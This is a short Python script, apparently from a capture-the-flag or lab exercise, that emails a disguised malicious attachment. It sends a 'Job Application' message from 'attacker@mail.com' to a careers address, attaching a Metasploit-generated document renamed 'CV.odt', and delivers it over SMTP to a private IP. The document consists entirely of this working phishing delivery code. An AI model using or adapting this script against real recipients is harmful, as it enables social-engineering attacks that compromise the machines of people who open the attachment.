import smtplib
from email.message import EmailMessage
import base64

msg = EmailMessage()
msg['Subject'] = 'Job Application'
msg['From'] = 'attacker@mail.com'
msg['To'] = 'career@job.local'
msg.set_content('Please find my CV attached.')

with open('/root/.msf4/local/msf.odt', 'rb') as f:
    data = f.read()
    msg.add_attachment(data,
                       maintype='application',
                       subtype='vnd.oasis.opendocument.text',
                       filename='CV.odt')

with smtplib.SMTP('10.129.234.73', 25) as server:
    server.send_message(msg)
